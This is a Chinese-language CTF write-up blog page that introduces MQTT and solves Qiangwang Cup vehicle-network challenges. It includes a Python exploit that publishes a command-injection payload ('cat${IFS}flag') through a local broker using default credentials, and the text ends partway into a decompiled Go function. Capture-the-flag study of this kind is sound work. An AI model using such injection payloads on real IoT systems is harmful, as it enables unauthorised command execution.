@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://ret2ldz.github.io/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github-style.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/light.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/dark.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/syntax.css' />
+    <title>MQTT - ldz&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="初探mqtt pwn" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://ret2ldz.github.io/post/mqtt%E5%88%9D%E6%8E%A2/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="MQTT - ldz&#39;s blog" />
+<meta name="twitter:description"
+  content="初探mqtt pwn" />
+<meta name="twitter:site" content="https://ret2ldz.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://ret2ldz.github.io/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="MQTT - ldz&#39;s blog">
+<meta property="og:description"
+  content="初探mqtt pwn" />
+<meta property="og:url" content="https://ret2ldz.github.io/post/mqtt%E5%88%9D%E6%8E%A2/" />
+<meta property="og:site_name" content="MQTT" />
+<meta property="og:image"
+  content="https://ret2ldz.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://ret2ldz.github.io/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" id="search-form" action="" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://ret2ldz.github.io/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://ret2ldz.github.io/">
+                  <img class=" avatar-user"
+                    src="images/images.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://ret2ldz.github.io/">ldz</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="https://ret2ldz.github.io/post/mqtt%E5%88%9D%E6%8E%A2/">MQTT</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 01 Jan 0001 00:00:00 &#43;0000"
+                    class="no-wrap">
+                    Mon, 01 Jan 0001 00:00:00 &#43;0000</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Sat, 20 Dec 2025 22:54:52 &#43;0800"
+                    class="no-wrap">
+                    Sat, 20 Dec 2025 22:54:52 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      3333 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/pwn">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      pwn
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><p><img src="../images/mqtt0.png" alt=""></p>
+<h2 id="tldr">TL;DR</h2>
+<p>通过几道题目简单的入门了MQTT协议并且第一次逆向了GO语言写出的程序，了解了MQTT协议的相关原理和特点。</p>
+<h3 id="什么是-mqtt">什么是 MQTT？</h3>
+<p>MQTT 是基于发布-订阅模式的通信协议，由 MQTT 客户端通过主题（Topic）发布或订阅消息，通过 MQTT Broker 集中管理消息路由，并依据预设的服务质量等级(QoS)确保端到端消息传递可靠性。</p>
+<p><strong>MQTT 客户端</strong></p>
+<p>任何运行 MQTT 客户端库的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 MQTT 测试工具也是客户端。</p>
+<p><strong>MQTT Broker</strong></p>
+<p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。一个高效强大的 MQTT Broker 能够轻松应对海量连接和百万级消息吞吐量，从而帮助物联网服务提供商专注于业务发展，快速构建可靠的 MQTT 应用。</p>
+<h3 id="环境配置">环境配置</h3>
+<p>我的选择是EMQX (for Broker) <a href="https://github.com/emqx/emqx">https://github.com/emqx/emqx</a>  &amp;MQTTx (for Client) <a href="https://mqttx.app/zh/docs/downloading-and-installation">https://mqttx.app/zh/docs/downloading-and-installation</a></p>
+<p>相关配置如下(我选择将tcp映射到9999端口)</p>
+<pre tabindex="0"><code>ldz@ldz-OMEN-by-HP-Gaming-Laptop-16-wf0xxx:~/Downloads/ezmqtt$ docker run -d --name emqx \
+  -p 9999:1883 -p 8083:8083 -p 8084:8084 \
+  -p 8883:8883 -p 18083:18083 \
+  emqx/emqx-enterprise:latest
+</code></pre><blockquote>
+<p>1883 : For Tcp</p>
+<p>8083 : For WebSocket</p>
+<p>8084 : For WebSocket + TLS</p>
+<p>8883 : For TLS/SSL</p>
+<p>18083 : For WebManagePage</p>
+</blockquote>
+<h4 id="qos"><strong>QoS</strong></h4>
+<p>MQTT 提供了三种服务质量（QoS），在不同网络环境下保证消息的可靠性。</p>
+<ul>
+<li>QoS 0：消息最多传送一次。如果当前客户端不可用，它将丢失这条消息。</li>
+<li>QoS 1：消息至少传送一次。</li>
+<li>QoS 2：消息只传送一次。</li>
+</ul>
+<h4 id="主题"><strong>主题</strong></h4>
+<p>MQTT 协议根据主题来转发消息。主题通过 <code>/</code> 来区分层级，类似于 URL 路径，例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-awk" data-lang="awk"><span class="line"><span class="cl"><span class="nx">chat</span><span class="o">/</span><span class="nx">room</span><span class="o">/</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">sensor</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="nx">temperature</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">sensor</span><span class="o">/+</span><span class="err">/temperature</span>
+</span></span></code></pre></div><p>MQTT 主题支持以下两种通配符：<code>+</code> 和 <code>#</code>。</p>
+<ul>
+<li><code>+</code>：表示单层通配符，例如 <code>a/+</code> 匹配 <code>a/x</code> 或 <code>a/y</code>。</li>
+<li><code>#</code>：表示多层通配符，例如 <code>a/#</code> 匹配 <code>a/x</code>、<code>a/b/c/d</code>。</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：通配符主题只能用于订阅，不能用于发布。</p>
+</blockquote>
+<h4 id="开发库-in-ccpp">开发库 in C/Cpp</h4>
+<table>
+<thead>
+<tr>
+<th>库名称</th>
+<th>简介</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Paho MQTT C/C++</strong></td>
+<td>Eclipse 官方维护的 MQTT 客户端库（libpaho-mqtt3c.so.1）</td>
+</tr>
+<tr>
+<td><strong>Mosquitto libmosquitto</strong></td>
+<td>来自 Mosquitto Broker 的官方 C 客户端</td>
+</tr>
+<tr>
+<td><strong>MQTT-C</strong></td>
+<td>纯 C 实现，轻量级</td>
+</tr>
+<tr>
+<td><strong>AsyncMQTTClient</strong></td>
+<td>针对 ESP32/ESP8266 的异步 MQTT 库</td>
+</tr>
+</tbody>
+</table>
+<h4 id="messagearrived-paho">messageArrived (Paho)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">messageArrived</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">context</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">topicName</span><span class="p">,</span> <span class="kt">int</span> <span class="n">topicLen</span><span class="p">,</span> <span class="n">MQTTClient_message</span> <span class="o">*</span><span class="n">message</span><span class="p">);</span>
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>原型中含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>a1</code></td>
+<td><code>context</code>（用户上下文，可为 NULL）</td>
+</tr>
+<tr>
+<td><code>a2</code></td>
+<td><code>topicName</code>（主题名字符串）</td>
+</tr>
+<tr>
+<td><code>a3</code></td>
+<td><code>topicLen</code>（主题长度）</td>
+</tr>
+<tr>
+<td><code>a4</code></td>
+<td><code>message</code>（<code>MQTTClient_message*</code>）</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">struct_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">struct_version</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">payloadlen</span><span class="p">;</span>       <span class="c1">// 消息长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span><span class="o">*</span> <span class="n">payload</span><span class="p">;</span>        <span class="c1">// 消息数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">qos</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">retained</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">msgid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">properties</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">MQTTClient_message</span><span class="p">;</span>
+</span></span></code></pre></div><h4 id="mqttclient_setcallbacks-paho">MQTTClient_setCallbacks (Paho)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">MQTTClient_setCallbacks</span>	<span class="p">(</span>	<span class="n">MQTTClient</span>	<span class="n">handle</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">void</span> <span class="o">*</span> 	<span class="n">context</span><span class="p">,</span> <span class="c1">//上下文 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">MQTTClient_connectionLost</span> <span class="o">*</span> 	<span class="n">cl</span><span class="p">,</span> <span class="c1">//连接断开回调
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">MQTTClient_messageArrived</span> <span class="o">*</span> 	<span class="n">ma</span><span class="p">,</span> <span class="c1">//接受数据回调
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">MQTTClient_deliveryComplete</span> <span class="o">*</span> 	<span class="n">dc</span>  <span class="c1">//发送成功回调
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">)</span>	
+</span></span></code></pre></div><h4 id="whats-more">What&rsquo;s more</h4>
+<p>mqtt只定义了一种数据传输方式，你依然可以采用编解码对你的Payload进行加密：<a href="https://mqttx.app/zh/docs/advanced#%E4%BD%BF%E7%94%A8-protocol-buffers">使用 Protocol Buffers</a></p>
+<h2 id="challenge-1-强网杯车联网ezmqtt">challenge 1 强网杯车联网ezmqtt</h2>
+<p><img src="../images/mqtt1.png" alt=""></p>
+<p>题目给出了一个MQTT客户端用于向broker发送讯息，我们通过client订阅同样的主题并接受信息<strong>belike</strong>:</p>
+<p><img src="../images/mqtt2.png" alt=""></p>
+<p>我们也可以通过python作为client订阅相同的主题向broker发送讯息并接受讯息</p>
+<h4 id="漏洞">漏洞</h4>
+<p><img src="../images/mqtt3.png" alt=""></p>
+<h4 id="exp">Exp</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># python 3.11</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">paho.mqtt</span> <span class="kn">import</span> <span class="n">client</span> <span class="k">as</span> <span class="n">mqtt_client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">broker</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">topic</span> <span class="o">=</span> <span class="s2">&#34;HTTP&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate a Client ID with the publish prefix.</span>
+</span></span><span class="line"><span class="cl"><span class="n">client_id</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;publish-</span><span class="si">{</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;public&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect_mqtt</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_connect</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">reasonCode</span><span class="p">,</span> <span class="n">properties</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">subscribe</span><span class="p">(</span><span class="s2">&#34;HTTP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Connected with result code </span><span class="si">{</span><span class="n">reasonCode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_message</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">payload</span>  <span class="c1"># Decode message payload</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[RECV] Topic: &#39;</span><span class="si">{</span><span class="n">msg</span><span class="o">.</span><span class="n">topic</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[RECV] Message: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">mqtt_client</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">mqtt_client</span><span class="o">.</span><span class="n">CallbackAPIVersion</span><span class="o">.</span><span class="n">VERSION2</span><span class="p">,</span> <span class="n">client_id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">username_pw_set</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_connect</span> <span class="o">=</span> <span class="n">on_connect</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_message</span> <span class="o">=</span> <span class="n">on_message</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">broker</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">keepalive</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">publish</span><span class="p">(</span><span class="n">topic</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">connect_mqtt</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="s2">&#34;GET /home/ctf/AAAAAAAAAA;cat$</span><span class="si">{IFS}</span><span class="s2">flag;#&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="s2">&#34;GET /home/ctf/index_html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="challenge-2-强网杯车联网mqtt">challenge 2 强网杯车联网mqtt</h2>
+<p>题目用go语言实现了一个mqtt客户端，程序主函数如下，可以看到程序注册了Msg回调函数和ConnectLost回调函数，同时把CTF作为接受消息的topic，CTF/send作为发送消息的topic。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">main_main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__int128</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// xmm15
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">version</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rcx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// rcx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">net_Dialer</span> <span class="o">*</span><span class="n">p_net_Dialer</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v15</span><span class="p">;</span> <span class="c1">// rdx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v16</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// rcx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v18</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">RTYPE</span> <span class="o">**</span><span class="n">v19</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v20</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">bool</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// cl
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v23</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">sync_WaitGroup</span> <span class="o">*</span><span class="n">v24</span><span class="p">;</span> <span class="c1">// rcx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">sync_WaitGroup</span> <span class="o">**</span><span class="n">v25</span><span class="p">;</span> <span class="c1">// r11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">v26</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-1E0h]
